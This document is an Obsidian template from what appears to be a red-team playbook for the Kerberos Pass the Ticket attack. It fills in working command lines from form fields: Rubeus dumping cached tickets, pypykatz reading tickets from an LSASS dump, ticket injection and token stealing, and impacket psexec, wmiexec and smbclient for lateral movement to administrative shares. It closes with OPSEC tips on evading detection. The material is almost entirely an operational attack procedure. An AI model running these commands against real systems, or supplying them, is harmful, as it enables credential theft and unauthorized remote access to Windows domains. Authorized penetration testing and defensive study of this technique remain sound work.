---
# Attack-specific fields
ptt_target_user:
ptt_ticket_b64:
ptt_target_fqdn:
ptt_service: cifs
ptt_luid:
notes:
---

# Pass the Ticket (PtT)

> [!abstract] Attack Summary
> **Pass the Ticket** injects an existing Kerberos TGT or TGS directly into a logon session, allowing authentication without a password or NTLM hash. More OPSEC-friendly than PtH because it uses legitimate Kerberos tickets. Requires access to existing tickets (from LSASS, memory, or previously obtained).

---

## Baseline (from [[00 - Engagement Baseline]])

```dataviewjs
const b = dv.page("Templates/New Templates/00 - Engagement Baseline");
dv.table(["Field", "Value"], [
  ["Domain",   b?.domain   ?? "—"],
  ["DC IP",    b?.dc_ip    ?? "—"],
  ["Username", b?.username ?? "—"],
  ["OS Env",   b?.os_env   ?? "—"],
]);
```

---

## Attack-Specific Configuration

```dataviewjs
const p = dv.current();
const services = ["cifs","http","ldap","mssqlsvc","host"];
const svcOptions = services.map(s => `option(${s})`).join(',');

dv.table(["Field", "Value"], [
  ["Target User",       `\`INPUT[text:ptt_target_user]\``],
  ["Target FQDN",       `\`INPUT[text:ptt_target_fqdn]\``],
  ["Service",           `\`INPUT[inlineSelect(defaultValue(${p.ptt_service ?? 'cifs'}),${svcOptions}):ptt_service]\``],
  ["LUID (if known)",   `\`INPUT[text:ptt_luid]\``],
]);
```

---

## Step 1 — Find and Extract Tickets

**Windows — Rubeus Triage**
```dataviewjs
dv.paragraph("```bash\n# List all cached tickets\nexecute-assembly C:\\Tools\\Rubeus\\Rubeus\\bin\\Release\\Rubeus.exe triage\n\n# Output shows: LUID, Username, Service, EndTime\n# Look for krbtgt service = TGT\n# Look for specific service tickets\n```");
```

**Windows — Rubeus Dump (all)**
```dataviewjs
dv.paragraph("```bash\n# Dump all tickets\nexecute-assembly C:\\Tools\\Rubeus\\Rubeus\\bin\\Release\\Rubeus.exe dump /nowrap\n```");
```

**Windows — Rubeus Dump (specific LUID)**
```dataviewjs
const p = dv.current();
const luid = p?.ptt_luid || "0xLUID";
dv.paragraph("```bash\nexecute-assembly C:\\Tools\\Rubeus\\Rubeus\\bin\\Release\\Rubeus.exe dump /luid:" + luid + " /nowrap\n```");
```

**Linux — Extract from LSASS via pypykatz**
```dataviewjs
dv.paragraph("```bash\n# Extract Kerberos tickets from LSASS dump\npypykatz lsa minidump lsass.dmp | grep -A5 'kerberos'\n\n# Or with Mimikatz-style output\npypykatz lsa minidump lsass.dmp -o loot.txt\n```");
```

LUID: `INPUT[text:ptt_luid]`

---

## Step 2 — Extract Ticket

**Windows — Rubeus Dump specific ticket**
```dataviewjs
const p = dv.current();
const luid = p?.ptt_luid || "0xLUID";
const svc  = p?.ptt_service || "krbtgt";
dv.paragraph("```bash\nexecute-assembly C:\\Tools\\Rubeus\\Rubeus\\bin\\Release\\Rubeus.exe dump /luid:" + luid + " /service:" + svc + " /nowrap\n```");
```

Paste ticket (base64): `INPUT[text:ptt_ticket_b64]`

---

## Step 3 — Import Ticket into Logon Session

**Windows — Rubeus createnetonly (recommended)**
```dataviewjs
const b = dv.page("Templates/New Templates/00 - Engagement Baseline");
const p = dv.current();
const domain      = b?.domain ?? "DOMAIN";
const shortDomain = domain.split('.')[0].toUpperCase();
const targetUser  = p?.ptt_target_user || "TARGET_USER";
const ticket      = p?.ptt_ticket_b64  || "BASE64_TICKET";
dv.paragraph("```bash\n# Create new logon session with ticket\nexecute-assembly C:\\Tools\\Rubeus\\Rubeus\\bin\\Release\\Rubeus.exe createnetonly " +
  "/program:C:\\Windows\\System32\\cmd.exe /domain:" + shortDomain +
  " /username:" + targetUser + " /password:FakePass /ticket:" + ticket + "\n\n# Steal token from new PID\nsteal_token PID\n```");
```

**Windows — Rubeus ptt (inject into current session)**
```dataviewjs
const p = dv.current();
const ticket = p?.ptt_ticket_b64 || "BASE64_TICKET";
dv.paragraph("```bash\n# Inject into current session (overwrites existing)\nexecute-assembly C:\\Tools\\Rubeus\\Rubeus\\bin\\Release\\Rubeus.exe ptt /ticket:" + ticket + "\n\n# Verify\nrun klist\n```");
```

**Linux — Export ccache**
```dataviewjs
const p = dv.current();
const targetUser = p?.ptt_target_user || "TARGET_USER";
dv.paragraph("```bash\n# If you have a .kirbi file\nimpacket-ticketConverter " + targetUser + ".kirbi " + targetUser + ".ccache\nexport KRB5CCNAME=" + targetUser + ".ccache\n\n# If you have base64 ticket\nbase64 -d <<< 'BASE64_TICKET' > " + targetUser + ".kirbi\nimpacket-ticketConverter " + targetUser + ".kirbi " + targetUser + ".ccache\nexport KRB5CCNAME=" + targetUser + ".ccache\n```");
```

---

## Step 4 — Use the Ticket

**Windows — Access Resources**
```dataviewjs
const p = dv.current();
const targetFqdn = p?.ptt_target_fqdn || "TARGET.domain.local";
const service    = p?.ptt_service || "cifs";
dv.paragraph("```bash\n# Verify ticket is loaded\nrun klist\n\n# Access target (always use FQDN)\nls \\\\" + targetFqdn + "\\c$\nrun dir \\\\" + targetFqdn + "\\c$\n\n# Remote execution\nshell net use \\\\" + targetFqdn + "\\c$\n```");
```

**Linux — Use with impacket tools**
```dataviewjs
const b = dv.page("Templates/New Templates/00 - Engagement Baseline");
const p = dv.current();
const domain     = b?.domain ?? "DOMAIN";
const targetFqdn = p?.ptt_target_fqdn || "TARGET.domain.local";
const targetUser = p?.ptt_target_user || "TARGET_USER";
dv.paragraph("```bash\n# With ccache set\nexport KRB5CCNAME=" + targetUser + ".ccache\n\nimpacket-psexec -k -no-pass " + domain + "/" + targetUser + "@" + targetFqdn + "\nimpacket-wmiexec -k -no-pass " + domain + "/" + targetUser + "@" + targetFqdn + "\nimpacket-smbclient -k -no-pass " + domain + "/" + targetUser + "@" + targetFqdn + "\n```");
```

---

## Step 5 — Renew TGT (Extend Validity)

**Windows — Rubeus renew**
```dataviewjs
const p = dv.current();
const ticket = p?.ptt_ticket_b64 || "BASE64_TICKET";
dv.paragraph("```bash\n# Renew TGT before it expires\nexecute-assembly C:\\Tools\\Rubeus\\Rubeus\\bin\\Release\\Rubeus.exe renew /ticket:" + ticket + " /nowrap\n```");
```

---

## OPSEC

> [!warning] Detection Indicators
> - **Event 4768** — TGT request (if renewing or requesting new TGS).
> - **Event 4769** — TGS request for specific service.
> - `createnetonly` creates process with `LOGON_TYPE = 9` (NewCredentials) — unusual process ancestry.
> - Kerberos is far stealthier than NTLM lateral movement.
> - Ensure tickets don't have anomalous encryption types (prefer AES over RC4).

---

## Notes & Results

`INPUT[textarea:notes]`
